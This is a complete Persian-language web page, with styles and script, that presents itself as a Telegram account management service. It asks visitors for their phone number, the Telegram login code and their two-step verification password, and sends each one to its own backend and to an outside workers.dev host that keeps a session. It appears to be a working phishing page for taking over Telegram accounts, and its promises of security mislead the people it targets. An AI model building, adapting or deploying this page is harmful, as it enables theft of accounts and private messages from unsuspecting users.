<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>کنترل حساب کاربری تلگرام خود</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* استایل‌های قبلی بدون تغییر باقی می‌مانند */
    :root {
      --primary-color: #0088cc;
      --primary-dark: #006da3;
      --secondary-color: #25d366;
      --text-color: #333;
      --text-light: #666;
      --background: #f5f5f5;
      --white: #ffffff;
      --error: #f44336;
      --success: #4caf50;
      --warning: #ff9800;
      --border-radius: 12px;
      --box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0088cc, #00a2ff);
      color: var(--text-color);
      direction: rtl;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 450px;
      margin: 0 auto;
    }

    .card {
      background: var(--white);
      border-radius: var(--border-radius);
      box-shadow: var(--box-shadow);
      padding: 30px;
      margin-bottom: 20px;
      transition: all 0.3s ease;
    }

    .welcome-card {
      text-align: center;
    }

    .logo {
      margin-bottom: 20px;
    }

    h1 {
      color: var(--primary-color);
      margin-bottom: 15px;
      font-size: 24px;
    }

    h2 {
      color: var(--primary-color);
      margin-bottom: 20px;
      font-size: 22px;
    }

    p {
      color: var(--text-light);
      margin-bottom: 20px;
      line-height: 1.6;
    }

    .features {
      text-align: right;
      margin: 25px 0;
    }

    .feature {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .feature i {
      color: var(--primary-color);
      margin-left: 10px;
      font-size: 20px;
    }

    .btn {
      display: inline-block;
      padding: 14px 28px;
      background-color: var(--primary-color);
      color: var(--white);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      text-align: center;
      transition: all 0.3s ease;
      width: 100%;
    }

    .btn:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
    }

    .btn:active {
      transform: translateY(0);
    }

    .btn-secondary {
      background-color: #f1f1f1;
      color: var(--text-color);
    }

    .btn-secondary:hover {
      background-color: #e5e5e5;
    }

    .btn-outline {
      background-color: transparent;
      border: 2px solid var(--primary-color);
      color: var(--primary-color);
    }

    .btn-outline:hover {
      background-color: var(--primary-color);
      color: var(--white);
    }

    .btn-small {
      padding: 10px 16px;
      font-size: 14px;
    }

    .input-group {
      margin: 20px 0;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-light);
      font-weight: 500;
    }

    input {
      width: 100%;
      padding: 14px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
    }

    .timer {
      text-align: center;
      margin: 15px 0;
      font-size: 16px;
      color: var(--text-light);
    }

    .timer span {
      font-weight: bold;
      color: var(--primary-color);
    }

    .action-buttons {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .action-buttons .btn {
      width: auto;
      flex: 1;
    }

    .hidden {
      display: none;
    }

    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 8px;
      min-height: 20px;
      font-size: 14px;
    }

    .status.info {
      background-color: #e3f2fd;
      border-right: 4px solid #2196f3;
      color: #0d47a1;
    }

    .status.success {
      background-color: #e8f5e9;
      border-right: 4px solid var(--success);
      color: #2e7d32;
    }

    .status.error {
      background-color: #ffebee;
      border-right: 4px solid var(--error);
      color: #c62828;
    }

    .status.loading {
      background-color: #fff3e0;
      border-right: 4px solid var(--warning);
      color: #e65100;
    }

    .status.loading::after {
      content: "...";
      animation: dots 1.5s steps(4, end) infinite;
    }

    .user-info {
      margin-top: 20px;
    }

    .user-info-card {
      background-color: #f8f8f8;
      border-radius: 8px;
      padding: 20px;
      text-align: right;
    }

    .user-info h3 {
      color: var(--primary-color);
      margin-bottom: 15px;
      font-size: 20px;
      border-bottom: 1px solid #ddd;
      padding-bottom: 10px;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      margin: 12px 0;
      padding-bottom: 12px;
      border-bottom: 1px dashed #eee;
    }

    .info-label {
      color: var(--text-light);
      font-weight: 500;
    }

    .info-value {
      color: var(--text-color);
      font-weight: 600;
    }

    .dev-notice {
      margin-top: 20px;
      padding: 15px;
      background-color: #fff3cd;
      border-radius: 8px;
      color: #856404;
      border-right: 4px solid #ffc107;
    }

    .dashboard-actions {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }

    .dashboard-actions .btn {
      flex: 1;
    }

    @keyframes dots {
      0%, 20% { content: "."; }
      40% { content: ".."; }
      60%, 100% { content: "..."; }
    }

    /* حالت پاسخگویی برای موبایل */
    @media (max-width: 480px) {
      .card {
        padding: 20px;
      }
      
      h1 {
        font-size: 22px;
      }
      
      h2 {
        font-size: 20px;
      }
      
      .btn {
        padding: 12px 20px;
      }
      
      .action-buttons {
        flex-direction: column;
      }
      
      .dashboard-actions {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- صفحه خوش آمدگویی -->
    <div id="welcomeScreen" class="card welcome-card">
      <div class="logo">
        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2Z" fill="#0088cc"/>
          <path d="M16.64 8.8C16.49 10.38 15.84 14.22 15.51 15.99C15.37 16.74 15.09 16.99 14.83 17.02C14.25 17.07 13.81 16.64 13.25 16.27C12.37 15.69 11.87 15.33 11.02 14.77C10.06 14.14 10.67 13.81 11.2 13.26C11.33 13.12 13.81 10.92 13.85 10.71C13.86 10.65 13.86 10.5 13.77 10.42C13.69 10.34 13.56 10.37 13.46 10.39C13.33 10.42 11.94 11.33 9.41 13.08C9 13.35 8.62 13.49 8.27 13.49C7.88 13.48 7.12 13.2 6.52 12.96C5.82 12.68 5.27 12.53 5.32 12.15C5.35 11.94 5.65 11.72 6.2 11.5C9.49 10.08 11.68 9.18 12.76 8.8C15.99 7.58 16.69 7.36 17.07 7.36C17.16 7.36 17.37 7.38 17.5 7.49C17.61 7.58 17.64 7.7 17.64 7.79C17.63 7.88 17.64 8.1 17.53 8.24C17.44 8.37 16.91 8.53 16.64 8.8Z" fill="white"/>
        </svg>
      </div>
      <h1>کنترل حساب کاربری تلگرام خود</h1>
      <p>با بهترین و پیشرفته‌ترین سیستم مدیریت حساب تلگرام، اطلاعات حساب خود را مشاهده و مدیریت کنید.</p>
      
      <div class="features">
        <div class="feature">
          <i class="fas fa-shield-alt"></i>
          <span>امنیت بالا و حفاظت از اطلاعات</span>
        </div>
        <div class="feature">
          <i class="fas fa-bolt"></i>
          <span>دسترسی سریع و آسان</span>
        </div>
        <div class="feature">
          <i class="fas fa-mobile-alt"></i>
          <span>سازگار با تمام دستگاه‌ها</span>
        </div>
      </div>
      
      <button id="startBtn" class="btn">
        شروع کنید
        <i class="fas fa-arrow-left" style="margin-right: 8px;"></i>
      </button>
    </div>

    <!-- صفحه وارد کردن شماره تلفن -->
    <div id="phoneScreen" class="card hidden">
      <h2>ورود به حساب کاربری</h2>
      <p>لطفاً شماره تلفن همراه خود را وارد کنید</p>
      
      <div class="input-group">
        <label for="phone">شماره تلفن</label>
        <input id="phone" type="tel" placeholder="مثال: +989123456789" />
      </div>

      <button id="sendPhone" class="btn">ارسال کد تایید</button>
      
      <div id="phoneStatus" class="status info">لطفاً شماره تلفن معتبر وارد کنید</div>
    </div>

    <!-- صفحه وارد کردن کد تایید -->
    <div id="codeScreen" class="card hidden">
      <h2>تأیید شماره تلفن</h2>
      <p>کد تأیید ارسال شده به تلگرام خود را وارد کنید</p>
      
      <div class="input-group">
        <label for="code">کد تأیید</label>
        <input id="code" type="text" placeholder="کد ۵ رقمی" />
      </div>
      
      <div class="timer" id="timer">زمان باقی‌مانده: <span id="timeLeft">02:00</span></div>
      
      <div class="action-buttons">
        <button id="verifyCode" class="btn">تأیید کد</button>
        <button id="resendCode" class="btn btn-secondary">ارسال مجدد</button>
      </div>
      
      <div id="codeStatus" class="status info">در انتظار دریافت و وارد کردن کد</div>
    </div>

    <!-- صفحه وارد کردن رمز دومرحله‌ای -->
    <div id="passwordScreen" class="card hidden">
      <h2>رمز دومرحله‌ای</h2>
      <p>لطفاً رمز دومرحله‌ای حساب خود را وارد کنید</p>
      
      <div class="input-group">
        <label for="password">رمز دومرحله‌ای</label>
        <input id="password" type="password" placeholder="رمز دومرحله‌ای خود را وارد کنید" />
      </div>
      
      <div class="action-buttons">
        <button id="verifyPassword" class="btn">تأیید رمز</button>
        <button id="backToPhone" class="btn btn-secondary">بازگشت</button>
      </div>
      
      <div id="passwordStatus" class="status info">لطفاً رمز دومرحله‌ای خود را وارد کنید</div>
    </div>

    <!-- صفحه داشبورد کاربر -->
    <div id="dashboardScreen" class="card hidden">
      <h2>خوش آمدید!</h2>
      <p>شما با موفقیت وارد حساب کاربری خود شدید.</p>
      
      <div class="user-info">
        <div class="user-info-card">
          <h3>مشخصات حساب کاربری</h3>
          <div class="info-row">
            <span class="info-label">نام:</span>
            <span class="info-value" id="userFirstName">در حال بارگذاری...</span>
          </div>
          <div class="info-row">
            <span class="info-label">نام خانوادگی:</span>
            <span class="info-value" id="userLastName">در حال بارگذاری...</span>
          </div>
          <div class="info-row">
            <span class="info-label">نام کاربری:</span>
            <span class="info-value" id="userUsername">در حال بارگذاری...</span>
          </div>
          <div class="info-row">
            <span class="info-label">شماره تلفن:</span>
            <span class="info-value" id="userPhone">در حال بارگذاری...</span>
          </div>
          <div class="info-row">
            <span class="info-label">شناسه کاربری:</span>
            <span class="info-value" id="userId">در حال بارگذاری...</span>
          </div>
        </div>
      </div>
      
      <div class="dev-notice">
        <i class="fas fa-tools"></i>
        این سیستم در حال توسعه است و قابلیت‌های جدید به زودی اضافه خواهند شد.
      </div>
      
      <div class="dashboard-actions">
        <button id="logoutBtn" class="btn btn-outline">خروج از حساب</button>
        <button id="refreshBtn" class="btn">بروزرسانی اطلاعات</button>
      </div>
      
      <div id="dashboardStatus" class="status info"></div>
    </div>
  </div>

  <script>
    // آدرس‌های API
    const API_BASE = '/api/login';
    const WORKER_URL = 'https://tell.a09627301.workers.dev';
    
    // عناصر DOM
    const welcomeScreen = document.getElementById('welcomeScreen');
    const phoneScreen = document.getElementById('phoneScreen');
    const codeScreen = document.getElementById('codeScreen');
    const passwordScreen = document.getElementById('passwordScreen');
    const dashboardScreen = document.getElementById('dashboardScreen');
    
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const passwordInput = document.getElementById('password');
    
    const sendPhoneBtn = document.getElementById('sendPhone');
    const verifyCodeBtn = document.getElementById('verifyCode');
    const resendCodeBtn = document.getElementById('resendCode');
    const verifyPasswordBtn = document.getElementById('verifyPassword');
    const backToPhoneBtn = document.getElementById('backToPhone');
    const startBtn = document.getElementById('startBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const refreshBtn = document.getElementById('refreshBtn');
    
    const phoneStatus = document.getElementById('phoneStatus');
    const codeStatus = document.getElementById('codeStatus');
    const passwordStatus = document.getElementById('passwordStatus');
    const dashboardStatus = document.getElementById('dashboardStatus');
    
    const timeLeftElement = document.getElementById('timeLeft');
    
    // متغیرهای سراسری
    let currentPhone = '';
    let currentPhoneCodeHash = '';
    let countdownInterval = null;
    let timeLeft = 120; // 2 دقیقه
    let sessionId = localStorage.getItem('telegram_session_id');
    let userData = null;

    // رویدادهای کلیک
    startBtn.addEventListener('click', showPhoneScreen);
    sendPhoneBtn.addEventListener('click', sendPhone);
    verifyCodeBtn.addEventListener('click', verifyCode);
    resendCodeBtn.addEventListener('click', resendCode);
    verifyPasswordBtn.addEventListener('click', verifyPassword);
    backToPhoneBtn.addEventListener('click', backToPhone);
    logoutBtn.addEventListener('click', logout);
    refreshBtn.addEventListener('click', checkSession);

    // بررسی session در صورت وجود
    document.addEventListener('DOMContentLoaded', function() {
      if (sessionId) {
        checkSession();
      } else {
        showWelcomeScreen();
      }
    });

    // نمایش صفحه خوش آمدگویی
    function showWelcomeScreen() {
      hideAllScreens();
      welcomeScreen.classList.remove('hidden');
    }

    // نمایش صفحه وارد کردن شماره تلفن
    function showPhoneScreen() {
      hideAllScreens();
      phoneScreen.classList.remove('hidden');
      phoneStatus.className = 'status info';
      phoneStatus.textContent = 'لطفاً شماره تلفن معتبر وارد کنید';
    }

    // نمایش صفحه وارد کردن کد تایید
    function showCodeScreen() {
      hideAllScreens();
      codeScreen.classList.remove('hidden');
      startTimer();
      codeStatus.className = 'status info';
      codeStatus.textContent = 'در انتظار دریافت و وارد کردن کد';
    }

    // نمایش صفحه وارد کردن رمز دومرحله‌ای
    function showPasswordScreen() {
      hideAllScreens();
      passwordScreen.classList.remove('hidden');
      passwordStatus.className = 'status info';
      passwordStatus.textContent = 'لطفاً رمز دومرحله‌ای خود را وارد کنید';
    }

    // نمایش صفحه داشبورد
    function showDashboardScreen() {
      hideAllScreens();
      dashboardScreen.classList.remove('hidden');
      updateUserInfo();
      dashboardStatus.className = 'status success';
      dashboardStatus.textContent = 'شما با موفقیت وارد حساب کاربری خود شدید.';
    }

    // مخفی کردن تمام صفحات
    function hideAllScreens() {
      welcomeScreen.classList.add('hidden');
      phoneScreen.classList.add('hidden');
      codeScreen.classList.add('hidden');
      passwordScreen.classList.add('hidden');
      dashboardScreen.classList.add('hidden');
    }

    // شروع تایمر
    function startTimer() {
      clearInterval(countdownInterval);
      timeLeft = 120;
      updateTimerDisplay();
      
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          codeStatus.className = 'status error';
          codeStatus.textContent = 'کد تأیید منقضی شده است. لطفاً کد جدیدی دریافت کنید.';
        }
      }, 1000);
    }

    // بروزرسانی نمایش تایمر
    function updateTimerDisplay() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timeLeftElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    // ارسال شماره تلفن
    async function sendPhone() {
      const phone = phoneInput.value.trim();
      
      if (!phone) {
        phoneStatus.className = 'status error';
        phoneStatus.textContent = 'لطفاً شماره تلفن را وارد کنید';
        return;
      }
      
      if (!phone.startsWith('+')) {
        phoneStatus.className = 'status error';
        phoneStatus.textContent = 'لطفاً شماره تلفن را با + و کد کشور وارد کنید';
        return;
      }
      
      currentPhone = phone;
      phoneStatus.className = 'status loading';
      phoneStatus.textContent = 'در حال ارسال درخواست...';
      
      try {
        const response = await fetch(API_BASE, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: 'sendCode',
            phone: phone
          })
        });
        
        const data = await response.json();
        
        if (data.success) {
          currentPhoneCodeHash = data.phoneCodeHash;
          phoneStatus.className = 'status success';
          phoneStatus.textContent = 'کد تأیید ارسال شد. لطفاً کد دریافتی را وارد کنید.';
          showCodeScreen();
        } else {
          phoneStatus.className = 'status error';
          phoneStatus.textContent = data.message || 'خطا در ارسال کد تأیید';
        }
      } catch (error) {
        console.error('Error sending phone:', error);
        phoneStatus.className = 'status error';
        phoneStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
      }
    }

    // تأیید کد
    async function verifyCode() {
      const code = codeInput.value.trim();
      
      if (!code) {
        codeStatus.className = 'status error';
        codeStatus.textContent = 'لطفاً کد تأیید را وارد کنید';
        return;
      }
      
      if (code.length !== 5) {
        codeStatus.className = 'status error';
        codeStatus.textContent = 'کد تأیید باید ۵ رقمی باشد';
        return;
      }
      
      codeStatus.className = 'status loading';
      codeStatus.textContent = 'در حال تأیید کد...';
      
      try {
        const response = await fetch(API_BASE, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: 'verifyCode',
            phone: currentPhone,
            code: code,
            phoneCodeHash: currentPhoneCodeHash
          })
        });
        
        const data = await response.json();
        
        if (data.success) {
          clearInterval(countdownInterval);
          userData = data.user;
          sessionId = data.sessionId;
          
          if (sessionId) {
            localStorage.setItem('telegram_session_id', sessionId);
          }
          
          codeStatus.className = 'status success';
          codeStatus.textContent = data.message || 'کد با موفقیت تأیید شد';
          showDashboardScreen();
        } else if (data.needPassword) {
          codeStatus.className = 'status info';
          codeStatus.textContent = 'حساب شما دارای رمز دومرحله‌ای است. لطفاً رمز خود را وارد کنید.';
          showPasswordScreen();
        } else {
          codeStatus.className = 'status error';
          codeStatus.textContent = data.message || 'خطا در تأیید کد';
        }
      } catch (error) {
        console.error('Error verifying code:', error);
        codeStatus.className = 'status error';
        codeStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
      }
    }

    // ارسال مجدد کد
    async function resendCode() {
      codeStatus.className = 'status loading';
      codeStatus.textContent = 'در حال ارسال مجدد کد...';
      
      try {
        const response = await fetch(API_BASE, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: 'sendCode',
            phone: currentPhone
          })
        });
        
        const data = await response.json();
        
        if (data.success) {
          currentPhoneCodeHash = data.phoneCodeHash;
          codeInput.value = '';
          startTimer();
          codeStatus.className = 'status success';
          codeStatus.textContent = 'کد تأیید مجدداً ارسال شد';
        } else {
          codeStatus.className = 'status error';
          codeStatus.textContent = data.message || 'خطا در ارسال مجدد کد';
        }
      } catch (error) {
        console.error('Error resending code:', error);
        codeStatus.className = 'status error';
        codeStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
      }
    }

    // تأیید رمز دومرحله‌ای
    async function verifyPassword() {
      const password = passwordInput.value.trim();
      
      if (!password) {
        passwordStatus.className = 'status error';
        passwordStatus.textContent = 'لطفاً رمز دومرحله‌ای را وارد کنید';
        return;
      }
      
      passwordStatus.className = 'status loading';
      passwordStatus.textContent = 'در حال تأیید رمز...';
      
      try {
        const response = await fetch(API_BASE, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: 'checkPassword',
            phone: currentPhone,
            password: password
          })
        });
        
        const data = await response.json();
        
        if (data.success) {
          userData = data.user;
          sessionId = data.sessionId;
          
          if (sessionId) {
            localStorage.setItem('telegram_session_id', sessionId);
          }
          
          passwordStatus.className = 'status success';
          passwordStatus.textContent = data.message || 'رمز با موفقیت تأیید شد';
          showDashboardScreen();
        } else {
          passwordStatus.className = 'status error';
          passwordStatus.textContent = data.message || 'خطا در تأیید رمز';
        }
      } catch (error) {
        console.error('Error verifying password:', error);
        passwordStatus.className = 'status error';
        passwordStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
      }
    }

    // بازگشت به صفحه شماره تلفن
    function backToPhone() {
      showPhoneScreen();
    }

    // خروج از حساب
    async function logout() {
      dashboardStatus.className = 'status loading';
      dashboardStatus.textContent = 'در حال خروج...';
      
      try {
        if (sessionId) {
          await fetch(API_BASE, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              action: 'logout',
              sessionId: sessionId
            })
          });
        }
        
        // پاک کردن اطلاعات session از localStorage
        localStorage.removeItem('telegram_session_id');
        sessionId = null;
        userData = null;
        
        // بازگشت به صفحه اول
        showWelcomeScreen();
      } catch (error) {
        console.error('Error during logout:', error);
        // حتی در صورت خطا، اطلاعات session پاک می‌شود
        localStorage.removeItem('telegram_session_id');
        sessionId = null;
        userData = null;
        showWelcomeScreen();
      }
    }

    // بررسی session
    async function checkSession() {
      if (!sessionId) {
        showWelcomeScreen();
        return;
      }
      
      dashboardStatus.className = 'status loading';
      dashboardStatus.textContent = 'در حال بررسی وضعیت ورود...';
      
      try {
        const response = await fetch(`${WORKER_URL}/api/check-session`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ sessionId })
        });
        
        const data = await response.json();
        
        if (data.success) {
          userData = data.user;
          updateUserInfo();
          dashboardStatus.className = 'status success';
          dashboardStatus.textContent = 'وضعیت ورود تأیید شد';
        } else {
          // اگر session معتبر نیست، آن را پاک کنید
          localStorage.removeItem('telegram_session_id');
          sessionId = null;
          showWelcomeScreen();
        }
      } catch (error) {
        console.error('Error checking session:', error);
        dashboardStatus.className = 'status error';
        dashboardStatus.textContent = 'خطا در بررسی وضعیت ورود';
      }
    }

    // بروزرسانی اطلاعات کاربر در داشبورد
    function updateUserInfo() {
      if (!userData) return;
      
      document.getElementById('userFirstName').textContent = userData.firstName || 'تعیین نشده';
      document.getElementById('userLastName').textContent = userData.lastName || 'تعیین نشده';
      document.getElementById('userUsername').textContent = userData.username ? '@' + userData.username : 'تعیین نشده';
      document.getElementById('userPhone').textContent = userData.phone || currentPhone;
      document.getElementById('userId').textContent = userData.id || 'تعیین نشده';
    }
  </script>
</body>
</html>
